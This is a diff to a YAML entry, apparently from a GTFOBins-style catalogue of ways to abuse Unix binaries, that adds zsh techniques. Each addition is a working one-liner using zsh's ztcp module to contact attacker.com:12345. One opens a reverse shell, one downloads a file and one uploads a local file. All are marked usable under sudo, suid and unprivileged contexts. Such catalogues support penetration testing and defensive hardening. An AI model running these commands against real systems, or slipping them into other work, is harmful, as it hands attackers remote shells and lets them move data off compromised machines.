@@ -1,5 +1,14 @@
 ---
 functions:
+  download:
+  - binary: false
+    code: |-
+      zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    sender: tcp-server
   file-read:
   - binary: false
     code: |-
@@ -31,6 +40,14 @@ functions:
       suid:
       unprivileged:
     from: less
+  reverse-shell:
+  - code: |-
+      zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    listener: tcp-server
   shell:
   - code: |-
       zsh
@@ -38,4 +55,13 @@ functions:
       sudo:
       suid:
       unprivileged:
+  upload:
+  - binary: false
+    code: |-
+      zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: tcp-server
 ...
